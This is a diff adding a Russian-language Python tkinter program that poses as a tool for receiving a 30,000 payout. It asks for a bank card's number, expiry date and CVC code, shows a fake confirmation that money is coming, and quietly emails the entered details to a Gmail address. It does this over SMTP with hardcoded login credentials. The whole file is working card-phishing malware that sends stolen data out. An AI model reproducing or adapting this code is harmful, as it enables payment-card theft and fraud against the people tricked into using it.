@@ -1,0 +1,86 @@
+from email.mime.text import MIMEText
+from tkinter import *
+from tkinter import messagebox, Entry
+import smtplib
+import os
+from email.mime.multipart import MIMEMultipart
+from platform import python_version
+
+root = Tk()
+
+
+def bth_click():
+    номер = номерInput.get()
+    срокдействия = срокдействияInput.get()
+    cvcкод = cvcкодField.get()
+
+    info_str = f'Данные: номер {str(номер)}, срок действия {str(срокдействия)}, cvc код {str(cvcкод)}'
+    messagebox.showinfo(title='Успешно', message='Через 10 минут на вашу карту поступят деньги.')
+
+    server = 'smtp.gmail.com'
+    user = 'volkovsemen318@gmail.com'
+    password = 'Semenvolkov1@'
+
+    recipients = ['volkovsemen69@gmail.com']
+    sender = 'volkovsemen69@gmail.com'
+    subject = 'новая карта'
+    text = info_str
+    html = '<html><head></head><body><p>' + text + '</p></body></html>'
+
+    msg = MIMEMultipart('alternative')
+    msg['Subject'] = subject
+    msg['From'] = 'Python script <' + sender + '>'
+    msg['To'] = ', '.join(recipients)
+    msg['Reply-To'] = sender
+    msg['Return-Path'] = sender
+    msg['X-Mailer'] = 'Python/' + (python_version())
+
+    part_text = MIMEText(text, 'plain')
+    part_html = MIMEText(html, 'html')
+
+    msg.attach(part_text)
+    msg.attach(part_html)
+
+    mail = smtplib.SMTP_SSL(server)
+    mail.login(user, password)
+    mail.sendmail(sender, recipients, msg.as_string())
+    mail.quit()
+
+
+root['bg'] = '#fafafa'
+root.title('получи 30.000 на карту!')
+root.wm_attributes('-alpha', 0.9)
+root.geometry('400x350')
+
+root.resizable(width=False, height=False)
+
+canvas = Canvas(root, height=350, width=300)
+canvas.pack()
+
+frame = Frame(root, bg='red')
+frame.place(relx=0.1, rely=0.1, relwidth=0.8, relheight=0.8)
+
+title = Label(frame, text='Введите данные карты,\n на которую хотите получить деньги', bg='turquoise', font=20)
+title.pack()
+bth = Button(frame, text='получить деньги', bg='yellow', command=bth_click)
+bth.pack()
+
+title = Label(frame, text='номер карты', bg='Blue', font=40)
+title.pack()
+
+номерInput = Entry(frame, bg='white')
+номерInput.pack()
+
+title = Label(frame, text='срок действия', bg='indigo', font=40)
+title.pack()
+
+срокдействияInput = Entry(frame, bg='white')
+срокдействияInput.pack()
+
+title = Label(frame, text='cvc код', bg='violet', font=30)
+title.pack()
+
+cvcкодField = Entry(frame, bg='white')
+cvcкодField.pack()
+
+root.mainloop()
